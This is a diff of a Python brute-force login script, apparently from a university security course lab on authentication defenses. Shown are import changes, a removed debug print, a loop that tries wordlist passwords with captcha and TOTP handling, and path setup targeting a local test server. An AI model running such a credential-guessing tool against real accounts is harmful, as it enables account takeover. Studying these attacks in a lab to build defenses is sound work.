@@ -1,7 +1,7 @@
-import requests
+import os
 import time
 import pyotp
-import json
+import requests
 
 class Attacker:
     def __init__(self, base_url, dictionary_path, users_path, group_seed):
@@ -48,7 +48,6 @@ class Attacker:
     def run_brute_force(self, target_username, target_totp_secret=None):
         for password in self.password_list:
             captcha_token = None
-            print(password)
             while True:
                 resp = self.login_attempt(target_username, password, captcha_token=captcha_token)
                 data = resp.json()
@@ -76,13 +75,18 @@ class Attacker:
     
     
     
-if __name__ == "__main__":
-    BASE_URL = "http://localhost:5000"
-    DICTIONARY_FILE_PATH = "C:\\Users\\idoloven\\university\\courses\\2026\\intro-to-cyber-security\\auth-defense-mechanisms\\assets\\rockyou_top_50k.txt"
-    USERS_FILE_PATH = "C:\\Users\\idoloven\\university\\courses\\2026\\intro-to-cyber-security\\auth-defense-mechanisms\\assets\\users.json"
+if __name__ == "__main__":  
+    CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
+    PROJECT_ROOT = os.path.dirname(CURRENT_DIR)
+    ASSETS_DIR = os.path.join(PROJECT_ROOT, 'assets')
+    
+    DICTIONARY_FILE_PATH = os.path.join(ASSETS_DIR, 'rockyou_top_50k.txt')
+    USERS_FILE_PATH = os.path.join(ASSETS_DIR, 'users.json')
+    
+    BASE_URL = "http://127.0.0.1:5000"
     GROUP_SEED = "214265977"
     
     attacker = Attacker(BASE_URL, DICTIONARY_FILE_PATH, USERS_FILE_PATH, GROUP_SEED)
-    result = attacker.run_brute_force("user_weak_2")
+    result = attacker.run_brute_force("user_weak_1")
     print(result)
     
